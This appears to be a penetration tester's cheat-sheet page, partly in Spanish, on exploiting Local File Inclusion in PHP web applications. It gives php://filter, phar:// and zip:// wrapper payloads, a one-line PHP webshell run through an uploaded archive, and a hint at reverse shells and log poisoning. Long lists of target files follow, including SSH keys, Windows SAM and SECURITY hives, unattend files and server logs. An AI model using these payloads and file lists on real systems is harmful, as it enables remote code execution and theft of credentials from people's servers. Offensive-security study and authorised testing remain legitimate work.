---
title: Local File Inclusion
layout: default
---

[PHP Wrappers - Deep Hacking](https://deephacking.tech/php-wrappers-pentesting-web/)

```
?file=php://filter/convert.base64-encode/resource=index
```

https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html

[Exploiting phar stream wrapper. There are a few protocols available… | by Rudra Sarkar | Medium](https://rudrasarkar.medium.com/exploiting-phar-stream-wrapper-d2140592c6e7)

```http
GET /index.php?file=phar://uploads/upload_1757759303.zip/shell&cmd=id 
```


Abriendo un zip:
```
// upload a php shell then use zip wrapper for reverse shell  
$ cat simple_cmd.php  
<?php system($_REQUEST["cmd"]); ?>  
  
  
// browse to the uploaded php webshell using Zip Wrapper LFI  
http://192.168.226.229/index.php?file=zip://uploads/upload_1714872711.zip%23simple_cmd&cmd=id
```

# Interesting Files 4 LFI
# Linux

```
.ssh/authorized_keys
```

```
/etc/nginx/nginx.conf
```

```
/etc/nginx/sites-available
```

```
/etc/nginx/sites-enable
```

```
/etc/mysql/my.cnf
```

```
/etc/httpd/httpd.conf
```

```
/etc/oracle2/oracle2.conf
```

```
/proc/net/arp
```

```
/proc
```

```
puertos abiertos
```

```
/etc/my.cnf
```

```
/etc/os-release
```

```
/etc/apache2/sites-enabled/000-default.conf
```

```
/etc/mysql -> moodle-key.conf
```

```
/var/log/apache2/access.log
```

```
/var/log/auth.log
```

```
/var/log/httpd-access.log
```

```
/etc/apache2/conf-available/security.conf
```

```
/etc/apache2/sites-enabled/vhost.conf
```

Ver lo que hace el DockerFile del repo para ver que archivos de configuración mueve

# Windows

```
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
c:/boot.ini
C:/boot.ini
C:/Documents and Settings/Administrator/NTUser.dat
c:/inetpub/logs/logfiles
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
c:/inetpub/wwwroot/global.asa
C:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php/php.ini
C:/php4/php.ini
C:/php5/php.ini
C:/Program Files (x86)/Apache Group/Apache/conf/access.log 
C:/Program Files (x86)/Apache Group/Apache/conf/error.log 
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf 
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf 
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml 
C:/Program Files (x86)/xampp/apache/conf/httpd.conf 
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log 
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err 
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log 
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files/MySQL/MySQL Server 5.1/my.ini 
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
C:/Users/Administrator/NTUser.dat
C:/Windows/debug/NetSetup.log 
C:/Windows/Panther/Unattend/Unattended.xml 
C:/Windows/Panther/Unattended.xml 
C:/WINDOWS/php.ini
C:/windows/repair/sam
C:/Windows/repair/security
C:/Windows/repair/software  
c:/windows/repair/system
C:/Windows/repair/system
C:/Windows/system32/config/AppEvent.Evt 
C:/Windows/system32/config/default.sav 
C:/Windows/system32/config/regback/default 
C:/Windows/system32/config/regback/sam 
C:/Windows/system32/config/regback/security 
C:/Windows/system32/config/regback/software
C:/Windows/system32/config/regback/system 
C:/Windows/system32/config/SecEvent.Evt 
C:/Windows/system32/config/security.sav 
C:/Windows/system32/config/software.sav 
C:/Windows/system32/config/system.sav 
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/System32/inetsrv/config/applicationHost.config 
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml 
C:/Windows/win.ini 
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log 
C:/xampp/apache/logs/error.log 
C:\xampp\htdocs\config.php
```

**httpd.conf para ver si se puede hacer log poisoning**
```
C:/xampp/apache/conf/httpd.conf
C:/wamp64/bin/apache/apache2.4.54/conf/httpd.conf
C:/wamp64/bin/apache/apache2.4.53/conf/httpd.conf
C:/wamp64/bin/apache/apache2.4.52/conf/httpd.conf
C:/wamp64/bin/apache/apache2.4.51/conf/httpd.conf
C:/wamp64/bin/apache/apache2.4.50/conf/httpd.conf
C:/laragon/bin/apache/httpd-2.4.54/conf/httpd.conf
C:/laragon/bin/apache/httpd-2.4.53/conf/httpd.conf
C:/laragon/bin/apache/httpd-2.4.52/conf/httpd.conf
C:/laragon/bin/apache/httpd-2.4.51/conf/httpd.conf
C:/laragon/bin/apache/httpd-2.4.50/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Apache24/conf/httpd.conf
```

SI no se ha configurado algo así, entonces no irá:

```bash
AddType application/x-httpd-php .log
```

